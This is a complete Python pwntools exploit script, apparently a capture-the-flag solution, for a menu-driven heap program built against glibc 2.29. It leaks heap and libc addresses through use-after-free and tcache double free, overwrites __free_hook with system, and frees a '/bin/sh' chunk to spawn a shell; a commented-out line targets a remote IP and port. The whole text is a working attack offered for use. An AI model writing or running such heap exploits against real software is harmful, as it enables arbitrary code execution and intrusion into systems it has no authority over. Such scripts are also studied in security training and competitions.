from pwn import *
context.log_level = 'debug'
prog = './pwn'
elf = ELF(prog)
p = process(prog)

libc = ELF("/home/luckyu/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so")
#p = remote("123.56.85.29", 4807)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def add(name='a'*8, content= 'a'*0x70):
	p.sendlineafter("choice : \n", '1')
	p.sendafter("name\n", name)
	p.sendafter("sex\n", 'W')
	p.sendafter("information\n", content.ljust(0x70, '\x00'))
def show(idx):
	p.sendlineafter("choice : \n", '2')
	p.sendlineafter("index : \n", str(idx))
def edit(idx, content='\x00'):
	p.sendlineafter("choice : \n", '3')
	p.sendlineafter("index : \n", str(idx))
	p.sendlineafter("sex?", 'Y')
	p.sendafter("information\n", content.ljust(0x70, '\x00'))
def free(idx):
	p.sendlineafter("choice : \n", '4')
	p.sendlineafter("index : \n", str(idx))
def exp():
	add()#0
	add()#1
	free(0)
	free(1)

	show(1)
	heap = u64(p.recv(6)+'\x00'*2)-0x270
	log.info("heap =" + hex(heap))
	edit(1)
	free(1)
	add(p64(heap), 'a')#2
	add()#3
	add('a'*8, '\xff'*0x10)#4
	free(3)
	show(3)
	libc.address = u64(p.recv(6)+'\x00'*2)-0x7f220c6b7ca0+0x7f220c4d3000
	log.info("libc.address ==> " + hex(libc.address))
	edit(4,'\x00'*0x10+p64(libc.sym['__free_hook'])*12)

	add(p64(libc.sym['system']), 'a')#5
	add('/bin/sh\x00', 'a')#6
	free(6)
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
